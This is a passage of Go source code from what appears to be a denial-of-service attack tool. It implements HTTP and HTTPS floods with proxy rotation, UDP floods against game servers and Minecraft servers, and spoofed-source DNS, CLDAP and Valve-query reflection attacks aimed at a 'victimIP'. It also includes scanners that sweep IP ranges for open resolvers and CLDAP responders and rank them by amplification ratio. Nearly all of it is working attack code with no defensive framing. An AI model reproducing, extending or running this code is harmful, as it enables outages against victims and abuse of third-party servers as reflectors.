	if len(targets) == 0 {
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int) {
				defer wg.Done()
				endTime := time.Now().Add(dur)
				client := newHTTPClient()
				var targetIdx uint64
				tc := newTimeCache()

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
					if !strings.HasPrefix(tgt, "http") {
						tgt = "http://" + tgt
					}

					if !s.checkRate(1) {
						time.Sleep(time.Millisecond * 10)
						continue
					}

					resp, err := client.Get(tgt)
					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						continue
					}
					resp.Body.Close()
					atomic.AddUint64(&s.Stats.PacketsSent, 1)
					atomic.AddUint64(&s.Stats.BytesSent, 1)
					tc.refresh()
				}
			}(i)
		}

		// 可中断等待：任务到期或被 Stop()/熔断关闭 StopChan 时立即返回，
		// 使 Stop() 不必阻塞到 duration 自然结束。
		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func StartHTTPSBypass(target string, duration int, threads int) *AttackSession {
	return StartHTTPSBypassEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
	})
}

func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "https_bypass", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int) {
				defer wg.Done()
				endTime := time.Now().Add(dur)
				var targetIdx uint64
				tc := newTimeCache()

				client := newProxyHTTPClient()
				iter := 0

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
					if !strings.HasPrefix(tgt, "https") {
						tgt = strings.Replace(tgt, "http://", "https://", 1)
						if !strings.HasPrefix(tgt, "https") {
							tgt = "https://" + tgt
						}
					}

					if !s.checkRate(1) {
						time.Sleep(time.Millisecond * 10)
						continue
					}

					if iter%20 == 0 {
						client.CloseIdleConnections()
						client = newProxyHTTPClient()
					}
					iter++

					resp, err := client.Get(tgt)
					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						continue
					}
					resp.Body.Close()
					atomic.AddUint64(&s.Stats.PacketsSent, 1)
					atomic.AddUint64(&s.Stats.BytesSent, 1)
					tc.refresh()
				}
			}(i)
		}

		// 可中断等待：任务到期或被 Stop()/熔断关闭 StopChan 时立即返回，
		// 使 Stop() 不必阻塞到 duration 自然结束。
		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func StartGameUDPSpam(target string, duration int, packetSize int, threads int, prefix []byte) *AttackSession {
	return StartGameUDPSpamEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
		PacketSize: packetSize, CustomPrefix: prefix,
	})
}

func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "game_udp", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	ip, port := SplitTarget(cfg.Target)
	if port == 0 {
		port = 27015
	}
	// 空 target 时 SplitTarget 返回 ip=""，而 ":27015" 会被 ResolveUDPAddr
	// 解析为 0.0.0.0:27015（本机），必须显式拦截
	if ip == "" {
		s.abort()
		return s
	}

	prefix := cfg.CustomPrefix
	if len(prefix) == 0 {
		prefix = gamePrefix(cfg.Game)
	}

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		s.abort()
		return s
	}

	// PacketSize 必须大于 prefix 长度，否则 rng.Read(buf[len(prefix):]) 越界 panic
	if cfg.PacketSize < len(prefix)+1 {
		cfg.PacketSize = len(prefix) + 1
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				conn, err := net.DialUDP("udp", nil, addr)
				if err != nil {
					atomic.AddUint64(&s.Stats.Errors, 1)
					return
				}
				defer conn.Close()

				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)
				tc := newTimeCache()

				buf := make([]byte, cfg.PacketSize)
				copy(buf, prefix)

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					if !s.checkRate(cfg.PacketSize) {
						time.Sleep(time.Microsecond * 100)
						continue
					}

					rng.Read(buf[len(prefix):])
					tc.refresh()

					n, err := conn.Write(buf)
					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
					} else {
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, uint64(n))
					}
				}
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func StartMinecraftAttack(target string, duration int, threads int, packetSize int, mode string) *AttackSession {
	return StartMinecraftAttackEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
		PacketSize: packetSize, Method: "minecraft_" + mode,
	})
}

func StartMinecraftAttackEx(cfg AttackConfig) *AttackSession {
	mode := strings.TrimPrefix(cfg.Method, "minecraft_")
	s := NewAttackSession(cfg.Target, cfg.Targets, "minecraft_"+mode, newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	ip, port := SplitTarget(cfg.Target)
	if port == 0 {
		port = 25565
	}

	// 包体至少 12 字节：prebuiltLogin 前缀 + 随机填充都不允许负长度
	if cfg.PacketSize < 12 {
		cfg.PacketSize = 12
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 && ip != "" {
		targets = []string{net.JoinHostPort(ip, fmt.Sprintf("%d", port))}
	}
	if len(targets) == 0 {
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		prebuiltHandshake := append([]byte{0x00, 0x00, 0xFF, 0xFF}, randomBytes(cfg.PacketSize-4)...)
		prebuiltLogin := append([]byte{0x02, 0x00, 0x07}, []byte("BotUser")...)
		prebuiltLogin = append(prebuiltLogin, randomBytes(cfg.PacketSize-len(prebuiltLogin))...)

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				endTime := time.Now().Add(dur)
				var targetIdx uint64
				tc := newTimeCache()

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					addr := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]

					if !s.checkRate(1) {
						time.Sleep(time.Millisecond * 10)
						continue
					}

					conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						continue
					}

					var pkt []byte
					switch mode {
					case "handshake":
						pkt = prebuiltHandshake
					case "login":
						pkt = prebuiltLogin
					}

					// WriteDeadline：防止目标不消费数据时 Write 永久阻塞
					conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
					conn.Write(pkt)
					atomic.AddUint64(&s.Stats.PacketsSent, 1)
					atomic.AddUint64(&s.Stats.BytesSent, uint64(len(pkt)))
					conn.Close()
					tc.refresh()
				}
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func randomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func SplitTarget(target string) (string, int) {
	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		return target, 0
	}
	port := 0
	fmt.Sscanf(portStr, "%d", &port)
	return host, port
}

// reflectorEntry 反射器条目：原始字符串（含池格式）+ 解析后的 UDP 地址。
// 字符串用于热池的失败记录/替换，地址用于实际发包。
type reflectorEntry struct {
	str    string
	addr   *net.UDPAddr
	domain string
}

func buildReflectorEntries(targets []string, defaultPort int) []reflectorEntry {
	entries := make([]reflectorEntry, 0, len(targets))
	for _, r := range targets {
		domain := ""
		targetStr := r
		if idx := strings.LastIndex(r, "|"); idx >= 0 {
			domain = r[idx+1:]
			targetStr = r[:idx]
		}
		ip, port := SplitTarget(targetStr)
		if port == 0 {
			port = defaultPort
		}
		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
		if err != nil {
			continue
		}
		entries = append(entries, reflectorEntry{str: r, addr: addr, domain: domain})
	}
	return entries
}

// startHotReflectorPool 按 80/20 划分活跃/备用并启动健康检查；
// 返回热池与 "原始字符串 → 条目" 映射（含 addr/domain）。调用方负责在攻击结束时 Stop。
func startHotReflectorPool(entries []reflectorEntry) (*HotReflectorPool, map[string]reflectorEntry) {
	strs := make([]string, len(entries))
	entryByStr := make(map[string]reflectorEntry, len(entries))
	for i, e := range entries {
		strs[i] = e.str
		entryByStr[e.str] = e
	}
	hot := NewHotReflectorPool(strs)
	hot.Start()
	return hot, entryByStr
}

func StartVSEAmplification(target string, reflectors []string, duration int, threads int, packetSize int) *AttackSession {
	return StartVSEAmplificationEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads, PacketSize: packetSize,
	})
}

func StartVSEAmplificationEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, nil, "vse_reflector", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	victimIP, _ := SplitTarget(cfg.Target)
	// 伪造源 IP 必须是合法 IPv4 地址（SpoofConn 仅支持 IPv4），
	// 非法/空目标时直接中止，避免静默无效攻击
	if net.ParseIP(victimIP) == nil || strings.Contains(victimIP, ":") {
		s.abort()
		return s
	}

	if cfg.PacketSize < 25 {
		cfg.PacketSize = 25
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	entries := buildReflectorEntries(cfg.Targets, 27015)
	if len(entries) == 0 {
		s.abort()
		return s
	}

	hot, entryByStr := startHotReflectorPool(entries)

	go func() {
		defer hot.Stop()
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()

				var spoof *SpoofConn
				useSpoof := cfg.CanSpoofIP

				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)

				var udpConn *net.UDPConn
				getConn := func() *net.UDPConn {
					if udpConn == nil {
						var err error
						udpConn, err = net.DialUDP("udp", nil, nil)
						if err != nil {
							return nil
						}
					}
					return udpConn
				}
				if !useSpoof {
					if getConn() == nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						return
					}
					defer udpConn.Close()
				}

				pkt := make([]byte, cfg.PacketSize)
				copy(pkt, a2sInfoReq)
				tc := newTimeCache()
				iter := 0
				active := hot.GetActive()

				for tc.since(endTime) < 0 {
					iter++
					select {
					case <-s.StopChan:
						return
					default:
					}

					if !s.checkRate(cfg.PacketSize) {
						time.Sleep(time.Microsecond * 100)
						continue
					}

					// 周期性刷新活跃列表，让热池健康检查的替换生效
					if iter%64 == 1 {
						active = hot.GetActive()
						if len(active) == 0 {
							time.Sleep(100 * time.Millisecond)
							continue
						}
					}
					refStr := active[rng.Intn(len(active))]
					ref := entryByStr[refStr]

					var err error
					if useSpoof {
						if spoof == nil {
							spoof, err = NewSpoofConn(ref.addr.IP.String(), ref.addr.Port)
							if err != nil {
								useSpoof = false
								if getConn() == nil {
									atomic.AddUint64(&s.Stats.Errors, 1)
									return
								}
								continue
							}
							defer spoof.Close()
						}
						err = spoof.Send(victimIP, ref.addr.IP.String(), ref.addr.Port, pkt)
					} else {
						_, err = udpConn.WriteToUDP(pkt, ref.addr)
					}

					if iter%16 == 0 {
						tc.refresh()
						if cfg.PacketSize > len(a2sInfoReq) {
							rng.Read(pkt[len(a2sInfoReq):])
						}
					}

					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						hot.RecordFailure(refStr)
					} else {
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, uint64(cfg.PacketSize))
					}
				}
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func resolveTargetStrings(cfg AttackConfig) []string {
	if len(cfg.Targets) > 0 {
		return cfg.Targets
	}
	if strings.Contains(cfg.Target, "\n") {
		var result []string
		for _, t := range strings.Split(cfg.Target, "\n") {
			t = strings.TrimSpace(t)
			if t != "" {
				result = append(result, t)
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	if cfg.Target != "" {
		return []string{cfg.Target}
	}
	return nil
}

func gamePrefix(game string) []byte {
	switch strings.ToLower(game) {
	case "pubg":
		return []byte("PUBG")
	case "ark":
		return []byte("ARK")
	case "fortnite":
		return []byte("FORT")
	default:
		return []byte("GAME")
	}
}

var (
	dnsAmplifyDomains []string
	ampDomain         string
	ampDomainSet      bool
	ampDomainMu       sync.RWMutex
)

func init() {
	SetDomains(nil)
}

var defaultBuiltinDomains = []string{
	"isc.org", "ripe.net", "cloudflare.com",
	"microsoft.com", "amazon.com", "netflix.com",
	"akamai.com", "stackoverflow.com", "google.com",
	"youtube.com", "github.com", "ietf.org",
	"wikipedia.org", "cloudfront.net",
}

// SetDomains 加载域名列表；空/未设置时回退内置列表（默认行为，用于启动初始化）。
func SetDomains(domains []string) {
	ampDomainMu.Lock()
	defer ampDomainMu.Unlock()
	if len(domains) == 0 {
		domains = defaultBuiltinDomains
	}
	dnsAmplifyDomains = append([]string{}, domains...)
	if ampDomainSet && ampDomain != "" {
		dnsAmplifyDomains = append([]string{ampDomain}, dnsAmplifyDomains...)
	}
}

// SetDomainsExplicit 显式设置域名列表：空列表表示管理员清空（禁用 DNS 放大），
// 不回退内置列表。用于 API 更新与 Worker 从 Controller 同步。
func SetDomainsExplicit(domains []string) {
	ampDomainMu.Lock()
	defer ampDomainMu.Unlock()
	dnsAmplifyDomains = append([]string{}, domains...)
	if ampDomainSet && ampDomain != "" {
		dnsAmplifyDomains = append([]string{ampDomain}, dnsAmplifyDomains...)
	}
}

func GetAmpDomains() []string {
	ampDomainMu.RLock()
	defer ampDomainMu.RUnlock()
	result := make([]string, 0, len(dnsAmplifyDomains))
	for _, d := range dnsAmplifyDomains {
		if d != ampDomain {
			result = append(result, d)
		}
	}
	return result
}

func SetAmpDomain(domain string) {
	ampDomainMu.Lock()
	defer ampDomainMu.Unlock()
	ampDomain = strings.TrimSpace(domain)
	ampDomainSet = ampDomain != ""
	if ampDomainSet {
		dnsAmplifyDomains = append([]string{ampDomain}, dnsAmplifyDomains...)
	}
}

func buildDNSQuery(domain string, qtype uint16) []byte {
	b := make([]byte, 0, 128)
	b = binary.BigEndian.AppendUint16(b, uint16(rand.Intn(65536)))
	b = binary.BigEndian.AppendUint16(b, 0x0100)
	b = binary.BigEndian.AppendUint16(b, 1)
	b = binary.BigEndian.AppendUint16(b, 0)
	b = binary.BigEndian.AppendUint16(b, 0)
	b = binary.BigEndian.AppendUint16(b, 0)

	for _, part := range strings.Split(domain, ".") {
		b = append(b, byte(len(part)))
		b = append(b, part...)
	}
	b = append(b, 0x00)

	b = binary.BigEndian.AppendUint16(b, qtype)
	b = binary.BigEndian.AppendUint16(b, 1)

	return b
}

var (
	dnsQueryA   = buildDNSQuery("isc.org", 1)
	dnsQueryANY = buildDNSQuery("isc.org", 255)
)

func buildEDNSQuery(domain string, qtype uint16, payloadSize uint16) []byte {
	q := buildDNSQuery(domain, qtype)
	binary.BigEndian.PutUint16(q[10:12], 1)
	edns := make([]byte, 11)
	edns[0] = 0x00
	binary.BigEndian.PutUint16(edns[1:3], 41)
	binary.BigEndian.PutUint16(edns[3:5], payloadSize)
	return append(q, edns...)
}

func buildDNSQueryPool(packetSize int) [][]byte {
	ampDomainMu.RLock()
	hasAmpDomain := ampDomainSet
	ampDomainCopy := ampDomain
	dnsAmplifyDomainsCopy := dnsAmplifyDomains
	ampDomainMu.RUnlock()

	if hasAmpDomain {
		if packetSize > 512 {
			return [][]byte{buildEDNSQuery(ampDomainCopy, 16, uint16(packetSize))}
		}
		return [][]byte{buildDNSQuery(ampDomainCopy, 16)}
	}

	domains := dnsAmplifyDomainsCopy
	queries := make([][]byte, 0, len(domains))
	useEDNS := packetSize > 512
	for _, domain := range domains {
		if useEDNS {
			queries = append(queries, buildEDNSQuery(domain, 16, uint16(packetSize)))
		} else {
			queries = append(queries, buildDNSQuery(domain, 16))
		}
	}
	return queries
}

func buildDNSQueryForDomain(domain string, packetSize int) []byte {
	if domain == "" {
		return nil
	}
	return buildEDNSQuery(domain, 16, uint16(packetSize))
}

func validAmpResponse(data []byte, n int) bool {
	if n < 12 {
		return false
	}
	if data[2]&0x80 == 0 {
		return false
	}
	if data[3]&0x0F != 0 {
		return false
	}
	if data[2]&0x02 != 0 {
		return false
	}
	if n < 500 {
		return false
	}
	return true
}

func BuildEDNSQueryForTest(domain string, qtype uint16, payloadSize uint16) []byte {
	return buildEDNSQuery(domain, qtype, payloadSize)
}

func TestDNSQuery(ip string, port int, query []byte, timeout time.Duration) ([]byte, bool, error) {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil, false, err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return nil, false, err
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(query); err != nil {
		return nil, false, err
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 65535)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, false, err
	}

	data := buf[:n]
	if len(data) < 12 {
		return data, false, fmt.Errorf("response too short (%d bytes)", len(data))
	}
	if data[2]&0x80 == 0 {
		return data, false, fmt.Errorf("not a DNS response (QR=0)")
	}
	if data[3]&0x0F != 0 {
		return data, false, fmt.Errorf("RCODE=%d", data[3]&0x0F)
	}
	tc := data[2]&0x02 != 0
	return data, tc, nil
}

func ScanDNSResolver(ip string, port int, timeout time.Duration) *ScanResult {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil
	}

	conn, err := net.ListenUDP("udp", nil)
	if err != nil {
		return nil
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, err := conn.WriteToUDP(dnsQueryA, addr); err != nil {
		return nil
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 4096)
	n, _, err := conn.ReadFromUDP(buf)
	if err != nil {
		return nil
	}

	if n < 12 || buf[2]&0x80 == 0 || buf[3]&0x0F != 0 {
		return nil
	}

	ampDomainMu.RLock()
	customDomain := ampDomain
	customDomainSet := ampDomainSet
	dnsDomains := make([]string, len(dnsAmplifyDomains))
	copy(dnsDomains, dnsAmplifyDomains)
	ampDomainMu.RUnlock()

	var bestDomain string
	var bestSize int
	var bestRatio float64
	bestTC := false
	buf2 := make([]byte, 65535)

	testDomain := func(domain string) (int, float64, bool, bool) {
		query := buildEDNSQuery(domain, 16, 65535)
		conn.SetWriteDeadline(time.Now().Add(timeout))
		if _, err := conn.WriteToUDP(query, addr); err != nil {
			return 0, 0, false, false
		}
		conn.SetReadDeadline(time.Now().Add(timeout))
		n2, _, err := conn.ReadFromUDP(buf2)
		if err != nil {
			return 0, 0, false, false
		}
		if !validAmpResponse(buf2, n2) {
			return 0, 0, false, false
		}
		ratio := float64(n2) / float64(len(query))
		tc := buf2[2]&0x02 != 0
		return n2, ratio, true, tc
	}

	if customDomainSet && customDomain != "" {
		size, ratio, ok, tc := testDomain(customDomain)
		if !ok {
			return nil
		}
		bestDomain = customDomain
		bestSize = size
		bestRatio = ratio
		bestTC = tc
	}

	for _, domain := range dnsDomains {
		size, ratio, ok, tc := testDomain(domain)
		if !ok {
			continue
		}
		if size > bestSize {
			bestDomain = domain
			bestSize = size
			bestRatio = ratio
			bestTC = tc
		}
	}

	if bestSize < 500 {
		return nil
	}

	return &ScanResult{
		IP:           ip,
		Port:         port,
		ResponseSize: bestSize,
		ServerName:   fmt.Sprintf("DNS(%dB %s)", bestSize, bestDomain),
		Game:         "dns",
		BestDomain:   bestDomain,
		AmpRatio:     bestRatio,
		TC:           bestTC,
	}
}

func ScanDNSRange(ctx context.Context, startIP, endIP string, port int, timeoutSec int, concurrency int) []ScanResult {
	start := ipToUint32(startIP)
	end := ipToUint32(endIP)
	if start > end {
		start, end = end, start
	}

	// 与 VSE 扫描一致的范围/并发保护：防 /8 段上亿请求、负并发 panic、
	// end=0xFFFFFFFF 时 ipInt 回绕导致的死循环
	total := uint64(end) - uint64(start) + 1
	if total > 65536 {
		return nil
	}
	if concurrency <= 0 || concurrency > 512 {
		concurrency = 50
	}

	var results []ScanResult
	var mu sync.Mutex

	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup
	timeout := time.Duration(timeoutSec) * time.Second

	for i := uint64(0); i < total; i++ {
		if ctx != nil {
			if err := ctx.Err(); err != nil {
				break
			}
		}
		ip := uint32ToIP(start + uint32(i))
		wg.Add(1)
		sem <- struct{}{}
		go func(ipStr string) {
			defer wg.Done()
			defer func() { <-sem }()

			result := ScanDNSResolver(ipStr, port, timeout)

			if result != nil {
				mu.Lock()
				results = append(results, *result)
				mu.Unlock()
			}
		}(ip)
	}

	wg.Wait()
	return results
}

func StartDNSAmplification(target string, reflectors []string, duration int, threads int, packetSize int) *AttackSession {
	return StartDNSAmplificationEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
		PacketSize: packetSize, Targets: reflectors,
	})
}

var cldapSearchReq = []byte{
	0x30, 0x25,
	0x02, 0x01, 0x01,
	0x63, 0x20,
	0x04, 0x00,
	0x0A, 0x01, 0x00,
	0x0A, 0x01, 0x00,
	0x02, 0x01, 0x00,
	0x02, 0x01, 0x00,
	0x01, 0x01, 0x00,
	0x87, 0x0B, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x63, 0x6C, 0x61, 0x73, 0x73,
	0x30, 0x00,
}

func GetCLDAPQuery() []byte {
	return cldapSearchReq
}

func cldapResponseSize(data []byte, n int) int {
	if n < 2 {
		return 0
	}
	if data[0] != 0x30 {
		return 0
	}
	return n
}

func TestCLDAPQuery(ip string, port int, timeout time.Duration) (int, error) {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return 0, err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return 0, err
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(cldapSearchReq); err != nil {
		return 0, err
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 65535)
	n, err := conn.Read(buf)
	if err != nil {
		return 0, err
	}

	data := buf[:n]
	if n < 8 || data[0] != 0x30 {
		return 0, fmt.Errorf("not a valid LDAP response")
	}
	return n, nil
}

func ScanCLDAPResponder(ip string, port int, timeout time.Duration) *ScanResult {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil
	}

	conn, err := net.ListenUDP("udp", nil)
	if err != nil {
		return nil
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, err := conn.WriteToUDP(cldapSearchReq, addr); err != nil {
		return nil
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 65535)
	n, _, err := conn.ReadFromUDP(buf)
	if err != nil {
		return nil
	}

	if n < 8 || buf[0] != 0x30 {
		return nil
	}

	querySize := len(cldapSearchReq)
	ratio := float64(n) / float64(querySize)

	return &ScanResult{
		IP:           ip,
		Port:         port,
		ResponseSize: n,
		ServerName:   fmt.Sprintf("CLDAP(%dB %0.1fx)", n, ratio),
		Game:         "cldap",
		AmpRatio:     ratio,
	}
}

func ScanCLDAPRange(ctx context.Context, startIP, endIP string, port int, timeoutSec int, concurrency int) []ScanResult {
	start := ipToUint32(startIP)
	end := ipToUint32(endIP)
	if start > end {
		start, end = end, start
	}

	// 与 VSE 扫描一致的范围/并发保护：防 /8 段上亿请求、负并发 panic、
	// end=0xFFFFFFFF 时 ipInt 回绕导致的死循环
	total := uint64(end) - uint64(start) + 1
	if total > 65536 {
		return nil
	}
	if concurrency <= 0 || concurrency > 512 {
		concurrency = 50
	}

	var results []ScanResult
	var mu sync.Mutex

	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup
	timeout := time.Duration(timeoutSec) * time.Second

	for i := uint64(0); i < total; i++ {
		if ctx != nil {
			if err := ctx.Err(); err != nil {
				break
			}
		}
		ip := uint32ToIP(start + uint32(i))
		wg.Add(1)
		sem <- struct{}{}
		go func(ipStr string) {
			defer wg.Done()
			defer func() { <-sem }()

			result := ScanCLDAPResponder(ipStr, port, timeout)
			if result != nil {
				mu.Lock()
				results = append(results, *result)
				mu.Unlock()
			}
		}(ip)
	}

	wg.Wait()
	return results
}

func StartCLDAPAmplification(target string, reflectors []string, duration int, threads int, packetSize int) *AttackSession {
	return StartCLDAPAmplificationEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
		PacketSize: packetSize, Targets: reflectors,
	})
}

func StartCLDAPAmplificationEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, nil, "cldap_reflector", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	victimIP, _ := SplitTarget(cfg.Target)
	if net.ParseIP(victimIP) == nil || strings.Contains(victimIP, ":") {
		s.abort()
		return s
	}

	// 请求包必须完整（41 字节 LDAP Search），小于该长度会发送残缺请求
	if cfg.PacketSize < len(cldapSearchReq) {
		cfg.PacketSize = len(cldapSearchReq)
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	entries := buildReflectorEntries(cfg.Targets, 389)
	if len(entries) == 0 {
		s.abort()
		return s
	}

	hot, entryByStr := startHotReflectorPool(entries)

	go func() {
		defer hot.Stop()
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()

				var spoof *SpoofConn
				useSpoof := cfg.CanSpoofIP

				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)

				var udpConn *net.UDPConn
				getConn := func() *net.UDPConn {
					if udpConn == nil {
						var err error
						udpConn, err = net.DialUDP("udp", nil, nil)
						if err != nil {
							return nil
						}
					}
					return udpConn
				}
				if !useSpoof {
					if getConn() == nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						return
					}
					defer udpConn.Close()
				}

				hasPadding := cfg.PacketSize > len(cldapSearchReq)
				q := make([]byte, cfg.PacketSize)
				copy(q, cldapSearchReq)
				tc := newTimeCache()
				iter := 0
				active := hot.GetActive()

				for tc.since(endTime) < 0 {
					iter++
					select {
					case <-s.StopChan:
						return
					default:
					}

					if !s.checkRate(cfg.PacketSize) {
						time.Sleep(time.Microsecond * 100)
						continue
					}

					// 周期性刷新活跃列表，让热池健康检查的替换生效
					if iter%64 == 1 {
						active = hot.GetActive()
						if len(active) == 0 {
							time.Sleep(100 * time.Millisecond)
							continue
						}
					}
					refStr := active[rng.Intn(len(active))]
					ref := entryByStr[refStr]

					if iter%16 == 0 {
						tc.refresh()
						if hasPadding {
							rng.Read(q[len(cldapSearchReq):])
						}
					}

					var err error
					if useSpoof {
						if spoof == nil {
							spoof, err = NewSpoofConn(ref.addr.IP.String(), ref.addr.Port)
							if err != nil {
								useSpoof = false
								if getConn() == nil {
									atomic.AddUint64(&s.Stats.Errors, 1)
									return
								}
								continue
							}
							defer spoof.Close()
						}
						err = spoof.Send(victimIP, ref.addr.IP.String(), ref.addr.Port, q)
					} else {
						_, err = udpConn.WriteToUDP(q, ref.addr)
					}

					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						hot.RecordFailure(refStr)
					} else {
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, uint64(len(q)))
					}
				}
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func StartDNSAmplificationEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, nil, "dns_reflector", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	victimIP, _ := SplitTarget(cfg.Target)
	if net.ParseIP(victimIP) == nil || strings.Contains(victimIP, ":") {
		s.abort()
		return s
	}

	if cfg.PacketSize < 1 {
		cfg.PacketSize = 4096
